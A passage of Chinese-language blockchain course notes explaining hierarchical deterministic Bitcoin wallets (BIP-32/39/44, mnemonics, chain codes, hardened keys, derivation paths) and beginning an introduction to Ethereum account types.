<p>另一方面，为了更好的匿名性，也需要更多的公私钥对，譬如最好是一笔交易换一个地址。自然，催生出一种需求，就是批量生成密钥。</p>
<h2 id="非确定性钱包"><a href="#非确定性钱包" class="headerlink" title="非确定性钱包"></a>非确定性钱包</h2><p><strong>之所以叫非确定性钱包，主要因为这种钱包生成的私钥，互相之间是没有任何关系的，每个私钥都是独立的。</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233050.jpg" alt="img">零型非确定性钱包示意图</p>
<h2 id="确定性钱包"><a href="#确定性钱包" class="headerlink" title="确定性钱包"></a>确定性钱包</h2><p>第二种类型是确定性钱包（deterministic wallet），其中所有的密钥都是从一个主密钥派生出来，这个主密钥即为种子（seed）。该类型钱包中所有密钥都相互关联，如果有原始种子，则可以再次生成全部密钥。确定性钱包中使用了许多不同的密钥推导方法。最常用的推导方法是使用树状结构，称为分级确定性钱包或HD钱包。确定性钱包由种子衍生创造。为了便于使用，种子被编码为英文单词，也称为助记词。</p>
<h3 id="HD钱包"><a href="#HD钱包" class="headerlink" title="HD钱包"></a>HD钱包</h3><p>下列 BIP 共同定义了一种确定性钱包的实现，这种钱包被称为分层确定性（HD，Hierarchical Deterministic）钱包。</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">BIP-32</a>，HD 钱包中的密钥如何衍生</li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki">BIP-39</a>，HD 钱包助记词（Mnemonic）和种子（Seed）的创建规则</li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki">BIP-44</a>，支持多币种和多账户的 HD 钱包</li>
</ul>
<p>除此之外，还有</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0043.mediawiki">BIP-43</a>，多用途（purpose）HD 钱包的结构定义</li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0045.mediawiki">BIP-45</a>，通过 P2SH 实现多签的 HD 钱包</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233051.jpg" alt="img">HD型钱包示意图</p>
<p>BIP-32&#x2F;BIP-44</p>
<p>BIP-32标准定义了HD钱包。HD钱包包含以树状结构衍生的密钥，使得父密钥可以衍生一系列子密钥，每个子密钥也可以衍生出一系列孙密钥，以此类推。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233052.jpg" alt="img"></p>
<p>HD钱包有两个主要的优势。第一，树状结构可以被用来表达额外的组织含义。比如当一个特定分支的子密钥被用来接收交易收入并且有另一个分支的子密钥用来负责支付花费。不同分支的密钥都可以被用在企业环境中，这就可以支配不同的分支部门、子公司、具体功能以及会计类别。第二，用户可以建立一个公钥的序列而不需要访问相对应的私钥。所以HD钱包在不安全的服务器中使用或者在每笔交易中发行不同的公钥。公钥不需要被预先加载或者提前衍生，而在服务器中不需要可用来支付的私钥。</p>
<p>下面来看一下，怎么样从种子生成密钥树。因为16进制表示的种子： 0C1E24E5917779D297E14D45F14E1A1A 难以记忆，所以BIP-39标准中定义了助记词。上面的种子相对应的助记词表示：</p>
<p>army van defense carry jealous true garbage claim echo media make crunch</p>
<p>思考：128位是如何生成12个助记词的？</p>
<p>助记词是由钱包使用BIP-39中定义的标准化过程自动生成的。 钱包从熵源开始，增加校验和，然后将熵映射到单词列表：</p>
<p>1、创建一个128到256位的随机序列（熵）。</p>
<p>2、提出SHA256哈希前几位（熵长&#x2F; 32），就可以创造一个随机序列的校验和。</p>
<p>3、将校验和添加到随机序列的末尾。</p>
<p>4、将序列划分为<strong>包含</strong>11位的不同部分。</p>
<p>5、将每个包含11位部分的值与一个已经预先定义2048个单词的字典做对应。</p>
<p>6、生成的有顺序的单词组就是助记码。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233053.jpg" alt="img"></p>
<p>总结一下：HD钱包具有管理多个密钥和地址的强大机制。由一系列英文单词生成种子是个标准化的方法，这样易于在钱包中转移、导出和导入， 这些英文单词被称为助记词，标准由BIP-39定义。大多数比特币钱包（以及其他加密货币的钱包）使用此标准，并可以使用可互操作的助记词导入和导出种子进行备份和恢复。</p>
<p>16进制表示： 0C1E24E5917779D297E14D45F14E1A1A</p>
<p>助记词表示：</p>
<p>army van defense carry jealous true garbage claim echo media make crunch</p>
<p>助记词表示长度为128至256位的熵。 通过使用密钥延伸函数PBKDF2，熵被用于导出较长的（512位）种子。将所得的种子用于构建确定性钱包并得到其密钥。</p>
<p>思考：能不能暴力破解他人的钱包？</p>
<p>创建助记词之后的7-9步是：</p>
<p>7、PBKDF2密钥延伸函数的第一个参数是从步骤6生成的助记符。</p>
<p>8、PBKDF2密钥延伸函数的第二个参数是盐。 由字符串常数“助记词”与可选的用户提供的密码字符串连接组成。</p>
<p>9、PBKDF2使用HMAC-SHA512算法，使用2048次哈希来延伸助记符和盐参数，产生一个512位的值作为其最终输出。 这个512位的值就是种子。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233054.jpg" alt="img"></p>
<p>有个这个512比特的种子，可以开始公私钥对的生成。</p>
<p>总结：HD钱包从单个根种子（root seed）中创建。最常见的是，这个种子是从助记符产生的，HD钱包的所有的确定性都衍生自这个根种子。任何兼容HD 钱包的根种子也可重新创造整个HD钱包。所以简单的转移HD钱包的根种子就让HD钱包中所包含的成千上百万的密钥被复制，储存导出以及导入。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233055.jpg" alt="img"></p>
<p>从上图可以看出，从root seed生成公私钥对的过程，就是对root seed进行一次HMAC-SHA512的加密哈希，在生成512的结果之后，将512位结果划分为两个256部分，分别是Master private key（主私钥）和Master Chain Code（主链码）。</p>
<p>HMAC-SHA512 使用 SHA512 哈希算法，以一个消息（Message）和一个密钥（Key）作为输入，生成 512 位（64 字节）的消息摘要（Digest）作为输出。</p>
<p>从种子计算主私钥时，种子作为输入的消息，字符串<code>Bitcoin seed</code>作为输入的密钥，计算产生 512 位的输出。</p>
<ul>
<li>输出的高 256 位，是主私钥</li>
<li>输出的低 256 位，是主链码（Master Chain Code）</li>
</ul>
<p>总结一下：</p>
<ul>
<li>种子从助记词和用户密语计算而来</li>
<li>助记词从一个随机序列计算而来，查阅特定的单词表后最终确定</li>
<li>即使随机序列的内容一样，查阅不同语言的单词表，可以得到不同的助记词，从而计算出不同的种子</li>
<li>即使助记词的内容一样，指定不同的密语，可以得到不同的种子</li>
</ul>
<p><strong>HD 钱包的确定性来源于种子，当种子确定后，钱包中的所有私钥就都是确定的，都可以从种子计算出来</strong>。</p>
<p>所以用户可以直接记录下这个种子的值，作为 HD 钱包的备份，只不过这一大串内容抄写起来有点麻烦。</p>
<p>对一个 HD 钱包，初始化种子的过程涉及到两个<strong>变量</strong>：</p>
<ul>
<li>助记词（由随机序列的内容和助记词的语言共同决定）</li>
<li>用户指定的密语</li>
</ul>
<p>所以在备份 HD 钱包时，需要<strong>同时备份助记词和密语</strong>，这样就相当于备份了整个钱包内的所有私钥。</p>
<p>HD 钱包中的私钥是树状的层级结构。</p>
<ul>
<li>树根位置的私钥，称为主私钥（Master Private Key），从种子直接计算得到</li>
<li>树中的某个私钥，从其父私钥计算得到。</li>
</ul>
<hr>
<p>然后从上图中还可以看到从主私钥有个箭头到Master Public Key，也即从私钥到公钥。</p>
<p>HD协议使用的是ECDSA公钥函数 point()，这个函数接受一个大整数（也即私钥），将它转换成图上的一个点，也即公钥。这也和我们的常识是符合的，非对称加密系统中，公私钥可以互相生成。而且椭圆曲线数学方案使得可以在不泄露私钥的情况下计算公钥。例如，这允许网络商店业务让其网络服务器为每个订单或每个客户生成新的地址（公钥哈希），而无需让网络服务器访问相应的私钥（花费收到的资金是必需的）。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">point(private_key) == public_key</span><br></pre></td></tr></table></figure>

<p>然后还有一个问题，为什么剩下的256位要作为链码呢？链码是用来干啥的呢？</p>
<p>这里我们要稍微了解一下point的工作特点。下面的这个等式是成立的。意味着什么呢？这里的参数 i理解为index，也即生成子密钥时的索引。通过将祖先私钥与索引 i 相加，然后传入到point()中，可以生成子公钥，这是左边的计算（私钥生成公钥，改变私钥，也就生成新的公私钥对）。等式右边显示的是，新生成的这个公钥完全不需要使用私钥来生成，直接根据祖先公钥来做就行了。也即，只要有公钥，就可以生成新的公钥。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">point( (parent_private_key + i) % p ) == parent_public_key + point(i)</span><br></pre></td></tr></table></figure>

<p>新生成的子公钥可以继续生成后代公钥。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">point( (child_private_key + i) % p ) == child_public_key + point(i)</span><br></pre></td></tr></table></figure>

<p>这个特点带来的影响是什么呢？</p>
<ol>
<li>如果共享一对祖先密钥的两个程序想就一系列的公私钥对达成一致，它们只需要共同商议确定下来一系列的整数就行了。</li>
<li>知道一个祖先公钥，可以生成多个子公钥，然后这些子公钥可以用来在不安全的服务器上使用，作为付款的接收地址。因为服务器并不知道私钥，所以服务器即使被攻击，也不会有私钥泄露的危险。</li>
<li>不论是子公钥还是更下层的后代公钥，如果是从子公钥能够推导出自己的兄弟姐妹公钥，那么生成多个公钥和只有一个公钥没有什么区别。因为任何人只要知道其中的一个，就能找出其他所有的。所以需要加入新的计算参数，切断同一父节点生成的兄弟姐妹公钥之间的联系。</li>
</ol>
<p><strong>扩展密钥</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233056.jpg" alt="img"></p>
<p>HD协议使用256位的Chain Code（也称作熵）来生成子密钥对，而且每个子密钥对都有自己的chain code。这样，即使有一个子密钥分支被攻击，其他的分支可以不受影响。</p>
<p>如上图所示，HD密钥的生成接收了四个输入：</p>
<ul>
<li>祖先私钥 和 祖先公钥</li>
<li>256位的祖先链码</li>
<li>32位的索引值</li>
</ul>
<p>上图的计算中，链码、公钥和索引值作为HMAC-SHA512的参数输入，产生512位确定的但是足够随机的输出。这512位输出的右一半的256位作为子密钥的链码。左一半的256位作为生成子密钥的输入lefthand_hash_output。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">child_private_key == (parent_private_key + lefthand_hash_output) % G</span><br><span class="line">child_public_key == point( (parent_private_key + lefthand_hash_output) % G )</span><br><span class="line">child_public_key == point(child_private_key) == parent_public_key + point(lefthand_hash_output)</span><br></pre></td></tr></table></figure>

<p>上面的三个等式，第一个是子私钥的生成；第二个是从子私钥生成子公钥；第三个是从父公钥直接生成子公钥。【注1：因为子公钥和父公钥之间的关系依赖于 point(lefthand_hash_output)， 而point(lefthand_hash_output)的值依赖于链码、父公钥和索引，缺少的值仅仅是链码】【注2：因为父公钥已知，链码在同一对父公私钥的情况下的是固定的，如果链码泄露的情况下，还是可以推导出兄弟姐妹公钥；】【注3：因此，扩展公钥，不同于公钥，公钥是理所当然应该公开的；而扩展公钥因为是公钥和链码的连接，为了保护链码，应该保护扩展公钥】</p>
<p>【Specifying different index numbers will create different unlinkable <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/child-key">child keys</a> from the same <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/parent-key">parent keys</a>. Repeating the procedure for the <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/child-key">child keys</a> using the <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/chain-code">child chain code</a> will create unlinkable grandchild keys.】</p>
<p>总结一下，根据 <a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">BIP-32</a> 的定义：</p>
<ul>
<li>可以从私钥和链码，衍生出其<strong>所有的</strong>子私钥及对应的子公钥（及之后每层所有的子私钥及对应的子公钥）</li>
<li>可以从公钥和链码，衍生出其<strong>常规衍生</strong>的子公钥（及之后每层常规衍生的子公钥）</li>
<li>无法从某个密钥（公钥和私钥）计算出其父密钥，或同层的其他兄弟密钥</li>
</ul>
<hr>
<p>衍生子密钥时需要将密钥、链码和子密钥序号作为 CKD 的输入，三者缺一不可。为了方便转录，可以将<strong>密钥</strong>和<strong>链码</strong>编码在一起，得到<strong>扩展密钥</strong>（Extended Key）。扩展私钥和相对应的扩展公钥具有相同的链码。扩展密钥使用 Base58Check 编码，并添加特定的版本前缀。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233057.jpg" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233058.jpg" alt="img"></p>
<p>安全性：</p>
<p>扩展密钥使用方便，但要注意：</p>
<ul>
<li>虽然泄露某个扩展公钥不会丢币，但会导致以此为根节点衍生出的扩展公钥全部泄露，破坏了隐私性</li>
<li>泄露扩展公钥和该公钥衍生出的之后任一代公钥对应的私钥，有被推导出该扩展公钥所有后代私钥的可能</li>
</ul>
<p>也即，如果攻击者获得了父链码和父公钥，那么就可以获得所有的子链码。有了子链码，如果又获得了底层的某一个私钥（孙子密钥），那么可以根据这个链码生成所有的扩展私钥。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233059.jpg" alt="img"></p>
<p>更惨的是，攻击者可能通过子密钥逆推回祖先私钥。也即，如果攻击者获得了一个扩展公钥，以及任何它的子孙私钥，那么就能够推出这个公钥对应的私钥，以及所有的后代密钥。</p>
<p>因此，扩展公钥的链码部分需要好好保存。也因此提出了强化子密钥的概念。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233060.jpg" alt="img"></p>
<p>强化的子密钥生成需要祖先链码、祖先私钥和索引值生成子链码和子私钥。这样的话，仅仅知道祖先扩展公钥不能用来生成强化的子公钥。（无法生成Left-hand-output，所以知道父公钥的情况下，也不能直接计算出子公钥；）</p>
<p>因此，强化的子密钥的应用场景没有正常生成的子密钥多。但是可以防御上面的攻击。</p>
<p>m表示私钥，M表示公钥；有小撇号的表示强化的子密钥。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233061.jpg" alt="img"></p>
<p>HD钱包树状结构提供了极大的灵活性。每一个母扩展密钥有40亿个子密钥：20亿个常规子密钥和20亿个强化子密钥。 而每个子密钥又会有40亿个子密钥并且以此类推。只要你愿意，这个树结构可以无限类推到无穷代。但是，又由于有了这个灵活性，对无限的树状结构进行导航就变得异常困难。为了能方便表示密钥间关系，定义了衍生路径（Derivation Path）的概念。</p>
<ul>
<li>序号之间以<code>/</code>分隔</li>
<li><code>m</code>表示主密钥</li>
<li><code>i</code>表示第 i个常规衍生的子密钥，即第 i个子密钥</li>
<li><code>i&#39;</code>表示第 i个硬化衍生的子密钥，即第 (2^31+i) 个子密钥</li>
</ul>
<p><code>m/0&#39;/1&#39;/2</code>表示主密钥的第 0 个强化衍生子密钥的第 1 个强化衍生子密钥的第 2 个常规衍生子密钥（树形结构）。</p>
<p>扩展密钥加上衍生路径，可以确定 HD 钱包里的一个密钥及从这个密钥衍生的之后所有层的子密钥（以这个密钥为根的子树）。</p>
<p>BIP-44提议了多账户结构作为“purpose”。所有遵循BIP-44的HD钱包依据只使用树的第一个分支的要求而被定义：m&#x2F;44’&#x2F;。 BIP-44指定了包含5个预定义树状层级的结构：</p>
<p>m &#x2F; purpose’ &#x2F; coin_type’ &#x2F; account’ &#x2F; change &#x2F; address_index</p>
<p>第一层的purpose总是被设定为44’。</p>
<p>第二层的“coin_type”特指币种并且允许多元货币HD钱包中的货币在第二个层级下有自己的亚树状结构。目前有三种货币被定义：Bitcoin is m&#x2F;44’&#x2F;0’、Bitcoin Testnet is m&#x2F;44’&#x2F;1’，以及 Litecoin is m&#x2F;44’&#x2F;2’。</p>
<p>树的第三层级是“account”，这可以允许使用者为了会计或者组织目的，而去再细分他们的钱包到独立的逻辑性亚账户。 举个例子，一个HD钱包可能包含两个比特币“账户”：m&#x2F;44’&#x2F;0’&#x2F;0’ 和 m&#x2F;44’&#x2F;0’&#x2F;1’。每个账户都是它自己亚树的根。</p>
<p>第四层级就是“change”。每一个HD钱包有两个亚树，一个是用来接收地址，一个是用来创造找零地址。注意无论先前的层级是否使用强化衍生，这一层级使用的都是常规衍生。这是为了允许这一层级的树可以在不安全环境下，输出扩展公钥。</p>
<p>被HD钱包衍生的可用的地址是第四层级的子级，就是第五层级的树的“address_index”。比如，第三个主账户接收比特币支付的地址就是 M&#x2F;44’&#x2F;0’&#x2F;0’&#x2F;0&#x2F;2。</p>
<p>举个例子：</p>
<p>用户初始化了一个 HD 钱包，使用衍生路径<code>m/44&#39;/236&#39;/0&#39;</code>作为存放 Bitcoin SV（BSV）的“账户”，那么，</p>
<ul>
<li>第一个收款地址是公钥<code>m/44&#39;/236&#39;/0&#39;/0/0</code>对应的地址，第二个收款地址是公钥<code>m/44&#39;/236&#39;/0&#39;/0/1</code>对应的地址，以此类推</li>
<li>当完成第一次支付并存在找零时，会找零到地址<code>m/44&#39;/236&#39;/0&#39;/1/0</code>，下一次支付找零到的地址会是<code>m/44&#39;/236&#39;/0&#39;/1/1</code>，以此类推</li>
<li>如果想再新建一个 BSV “账户”另作他用，可以使用路径<code>m/44&#39;/236&#39;/1&#39;</code></li>
<li>如果还想用这个 HD 钱包存放 BCH，可以使用路径<code>m/44&#39;/145&#39;/0&#39;</code></li>
</ul>
<h3 id="HD-钱包的优势"><a href="#HD-钱包的优势" class="headerlink" title="HD 钱包的优势"></a>HD 钱包的优势</h3><p>HD 钱包在备份时十分方便。</p>
<ul>
<li>只需要备份<strong>助记词</strong>和<strong>密语</strong>，就等于备份了整个钱包内的所有私钥</li>
<li>除此之外，你还要记下使用的<strong>衍生路径</strong>，这样才能知道使用了哪些私钥</li>
</ul>
<p>另外，从扩展公钥可以常规衍生子公钥及对应地址而不用访问扩展私钥或私钥本身，这是 HD 钱包一个很重要的安全特性。</p>
<p>密钥间的树形结构，与机构的部门设置十分相似，如果一家企业准备使用比特币进行财务收支，可以：</p>
<ul>
<li><p>将路径<code>m/0&#39;/0&#39;/x&#39;</code>的扩展公钥交给各销售部门独自管理和使用</p>
</li>
<li><ul>
<li>销售部门可以为每笔订单生成不同的收款地址，方便状态跟踪</li>
<li>因为从扩展公钥无法衍生出子私钥，所以销售部门只能收款而无法支付账户里的比特币</li>
</ul>
</li>
<li><p>将路径<code>m/0&#39;/0&#39;</code>的扩展公钥交给市场部，市场部可以查阅所有订单的销售记录，同样无法支付比特币</p>
</li>
<li><p>将路径<code>m/0&#39;/0&#39;</code>的扩展私钥交给财务部，财务部可以用这个更上层的扩展私钥，管理整个公司的加密资产</p>
</li>
</ul>
<p>配合 <a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0045.mediawiki">BIP-45</a> 定义的 HD 钱包多签方案，可以方便、安全、灵活的管理公司的加密资产。</p>
<p>练习（天书般的<a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">bip32</a>）</p>
<p>The function CKDpriv((kpar, cpar), i) → (ki, ci) computes a child extended private key from the parent extended private key从父扩展私钥计算子扩展私钥:</p>
<p>The function CKDpub((Kpar, cpar), i) → (Ki, ci) computes a child extended public key from the parent extended public key. It is only defined for non-hardened child keys.从父扩展公钥计算子扩展公钥。它只定义为非hardened child</p>
<p>The function N((k, c)) → (K, c) computes the extended public key corresponding to an extended private key (the “neutered” version, as it removes the ability to sign transactions).计算与扩展私钥对应的扩展公钥(“neutered”版本，因为它删除了签署交易的能力)。</p>
<p>The function N((k, c)) → (K, c) computes the extended public key corresponding to an extended private key</p>
<p>To compute the public child key of a parent private key:要计算父私钥的公用子密钥</p>
<ul>
<li>N(CKDpriv((kpar, cpar), i)) (works always).</li>
<li>CKDpub(N(kpar, cpar), i) (works only for non-hardened child keys).仅适用于非硬化子密钥</li>
</ul>
<p>Child key derivation (CKD) ：The function CKDpriv((kpar, cpar), i) → (ki, ci) computes a child extended private key from the parent extended private key，function CKDpub((Kpar, cpar), i) → (Ki, ci) computes a child extended public key from the parent extended public key。</p>
<p>To shorten notation, we will write CKDpriv(CKDpriv(CKDpriv(m,3H),2),5) as m&#x2F;3H&#x2F;2&#x2F;5. Equivalently for public keys, we write CKDpub(CKDpub(CKDpub(M,3),2),5) as M&#x2F;3&#x2F;2&#x2F;5. This results in the following identities:</p>
<ul>
<li>N(m&#x2F;a&#x2F;b&#x2F;c) &#x3D; N(m&#x2F;a&#x2F;b)&#x2F;c &#x3D; N(m&#x2F;a)&#x2F;b&#x2F;c &#x3D; N(m)&#x2F;a&#x2F;b&#x2F;c &#x3D; M&#x2F;a&#x2F;b&#x2F;c.</li>
<li>N(m&#x2F;aH&#x2F;b&#x2F;c) &#x3D; N(m&#x2F;aH&#x2F;b)&#x2F;c &#x3D; N(m&#x2F;aH)&#x2F;b&#x2F;c.</li>
</ul>
<p>However, N(m&#x2F;aH) cannot be rewritten as N(m)&#x2F;aH, as the latter is not possible.</p>
<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://bitcoinchallenge.codes/">Bitcoin Challenge</a></li>
<li><a href="https://link.zhihu.com/?target=https://bitcoiner.today/en/bitcoin-challenge-310-btc-clues-to-its-resolution-i/">Bitcoin Challenge 310 BTC: Clues to its resolution (I) - bitcoiner today</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.youtube.com/watch?v=Vbzwkl4MlLs">https://www.youtube.com/watch?v=Vbzwkl4MlLs</a></li>
<li><a href="https://link.zhihu.com/?target=http://book.8btc.com/books/6/masterbitcoin2cn/_book/ch05.html">第五章 钱包 · 巴比特图书</a></li>
<li><a href="https://link.zhihu.com/?target=https://bitcoin.org/en/developer-guide%23hierarchical-deterministic-key-creation">Developer Guide - Bitcoin</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">bitcoin&#x2F;bips</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnews.com/articles/145568296316.htm">https://www.chainnews.com/articles/145568296316.htm</a></li>
<li><a href="https://link.zhihu.com/?target=https://aaron67.cc/2019/01/22/bitcoin-wallet/">https://aaron67.cc/2019/01/22/bitcoin-wallet/</a></li>
</ol>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ol>
<li>全账本节点为什么要向spv节点提供merkle路径服务</li>
<li>用户提供这笔输入所在的区块，以及这笔交易在第一几笔交易，用户怎么通过自己的公钥找到这个区块hash？是遍历吗</li>
<li>矿工怎么验证这笔输入有效，逐一遍历吗？</li>
<li></li>
</ol>
<h1 id="区块链技术11-以太坊介绍"><a href="#区块链技术11-以太坊介绍" class="headerlink" title="区块链技术11:以太坊介绍"></a>区块链技术11:以太坊介绍</h1><p>从这一节开始，我们准备介绍两个对比特币的重大变化，以太坊和EOS。</p>
<p>以太坊的概念首次在2013至2014年间由程序员Vitalik Buterin受比特币启发后提出，大意为“下一代加密货币与去中心化应用平台”，在2014年通过ICO众筹开始得以发展。截至2018年2月，以太币是市值第二高的加密货币，仅次于比特币。可以查看参考[<a href="https://link.zhihu.com/?target=https://ethfans.org/wikis/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%8E%86%E5%8F%B2">1]</a>了解以太坊的发展历史。</p>
<p>介绍完之前关于比特币的内容之后，我们应该可以看懂以太坊白皮书前面一部分的内容了。白皮书中对比特币的重要技术和特征作了一个回顾和总结。大家可以自己看看这个<a href="https://link.zhihu.com/?target=https://bitcoin.org/files/bitcoin-paper/bitcoin_zh_cn.pdf">白皮书</a>，确认一下自己之前的学习效果。</p>
<p>那接下来，我们主要讲的是从对比特币的介绍之后的内容，也即白皮书中对比特币脚本语言的限制的描述，通过分析以太坊对比特币的缺陷，我们来理解以太坊的特征。<a href="https://link.zhihu.com/?target=https://ethfans.org/posts/ethereum-whitepaper/">以太坊白皮书</a>。</p>
<p>比特币系统的脚本语言存在一些严重的限制：</p>
<ul>
<li><strong>缺少图灵完备性</strong> – 这就是说，尽管比特币脚本语言可以支持多种计算，但是它不能支持所有的计算。最主要的缺失是循环语句。不支持循环语句的目的是避免交易确认时出现无限循环。理论上，对于脚本程序员来说，这是可以克服的障碍，因为任何循环都可以用多次重复if 语句的方式来模拟，但是这样做会导致脚本空间利用上的低效率，例如，实施一个替代的椭圆曲线签名算法可能将需要256次重复的乘法，而每次都需要单独编码。</li>
<li><strong>价值盲（Value-blindness）</strong>。UTXO脚本不能为账户的取款额度提供精细的的控制。例如，预言机合约（oracle contract）的一个强大应用是对冲合约，A和B各自向对冲合约中发送价值1000美元的比特币，30天以后，脚本向A发送价值1000美元的比特币，向B发送剩余的比特币。虽然实现对冲合约需要一个预言机（oracle）决定一比特币值多少美元，但是与现在完全中心化的解决方案相比，这一机制已经在减少信任和基础设施方面有了巨大的进步。然而，因为UTXO是不可分割的，为实现此合约，唯一的方法是非常低效地采用许多有不同面值的UTXO（例如对应于最大为30的每个k，有一个2^k的UTXO)并使预言机挑出正确的UTXO发送给A和B。</li>
<li><strong>缺少状态</strong> – UTXO只能是已花费或者未花费状态，这就没有给需要任何其它内部状态的多阶段合约或者脚本留出生存空间。这使得实现多阶段期权合约、去中心化的交换要约或者两阶段加密承诺协议（对确保计算奖励非常必要）非常困难。这也意味着UTXO只能用于建立简单的、一次性的合约，而不是例如去中心化组织这样的有着更加复杂的状态的合约，使得元协议难以实现。二元状态与价值盲结合在一起意味着另一个重要的应用-取款限额-是不可能实现的。</li>
<li><strong>区块链盲（Blockchain-blindness）</strong>- UTXO看不到区块链的数据，例如随机数和上一个区块的哈希。这一缺陷剥夺了脚本语言所拥有的基于随机性的潜在价值，严重地限制了博彩等其它领域应用。</li>
</ul>
<p>在白皮书中，引入以太坊的时候，这样介绍：</p>
<p>“以太坊的目的是基于脚本、竞争币和链上元协议（on-chain meta-protocol）概念进行整合和提高，使得开发者能够创建任意的基于共识的、可扩展的、标准化的、特性完备的、易于开发的和协同的应用。……并且因为图灵完备性、价值知晓（value-awareness）、区块链知晓（blockchain-awareness）和多状态所增加的力量而比比特币脚本所能提供的智能合约强大得多。”</p>
<p>既然以太坊社区选择让以太坊拥有如此强大的功能，那么相对应的，他们也必须为此做好准备。我们一条条看一下，为了实现对比特币的改进，以太坊必须添加什么功能。</p>
<p>对比一下以太坊白皮书中列出的比特币和以太坊的状态转换图：</p>
<p>比特币作为状态转移系统</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233062.jpg" alt="img"></p>
<p>以太坊的状态转换：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233063.jpg" alt="img"></p>
<p>在上图中，起始状态保护了四个账户，分别是14c5f8ba、bb75a980、892bf92f、4096ad65。其中14c5f8ba和4096ad65仅维护了余额；bb75a980和892bf92f除了余额之外，还包括一部分的代码和数据。交易数据由14c5f8ba发送到bb75a980，转账10个以太币。同时发送了两个数据2和“charlie”。这个数据传递到账户bb75a980时，触发了bb75a980账户中的代码，意思是如果在对应于交易中携带的数据中的第一个（作为索引），也即tx.data[0]，相对应的位置处的数据是0，则对该位置出的数据进行更新，更新为第二个数据，也即‘charlie’。</p>
<p>所以，这里我们首先需要理解一下以太坊账户的概念。</p>
<p>以太坊的全局“共享状态”是有很多对象（账户）来组成的，这些账户可以通过消息传递架构来与对方进行交互。每个账户都有一个与之关联的状态(state)和一个20字节的地址(address)。在以太坊中一个地址是160位的标识符，用来识别账户的。</p>
<p>有两种类型的账户：</p>
<ol>
<li>外部拥有的账户，被私钥控制且没有任何代码与之关联</li>
<li>合约账户，被它们的合约代码控制且有代码与之关联</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233064.jpg" alt="img"></p>
<h2 id="外部拥有账户（EOA）与合约账户的比较"><a href="#外部拥有账户（EOA）与合约账户的比较" class="headerlink" title="外部拥有账户（EOA）与合约账户的比较"></a>外部拥有账户（EOA）与合约账户的比较</h2><p>理解外部拥有账户和合约账户的基本区别是很重要的。一个外部拥有的账户可以通过创建和用自己的私钥来对交易进行签名，来发送消息给另一个外部拥有账户或合约账户。在两个外部拥有账户之间传送的消息只是一个简单的价值转移。但是从外部拥有的账户到合约账户的消息会激活合约账户的代码，允许它执行各种动作。（比如转移代币，写入内部存储，挖出一个新代币，执行一些运算，创建一个新的合约等等）。</p>
<p>不像外部拥有账户，合约账户不可以自己发起一个交易。相反，合约账户只有在接收到一个交易之后(从一个外部拥有账户或另一个合约账户接)，为了响应此交易而触发一个交易。我们将会在“交易和消息”部分来了解关于合约与合约之间的通信。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233065.jpg" alt="img"></p>
<p>因此，在以太坊上任何的动作，总是被外部控制账户触发的交易所发动的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233066.jpg" alt="img"></p>
<h3 id="账户状态"><a href="#账户状态" class="headerlink" title="账户状态"></a>账户状态</h3><p>账户状态有四个组成部分，不论账户类型是什么，都存在这四个组成部分：</p>
<ol>
<li>nonce：如果账户是一个外部拥有账户，nonce代表从此账户地址发送的交易序号。如果账户是一个合约账户，nonce代表此账户创建的合约序号</li>
<li>balance： 此地址拥有Wei的数量。1 Ether&#x3D;10^18 Wei</li>
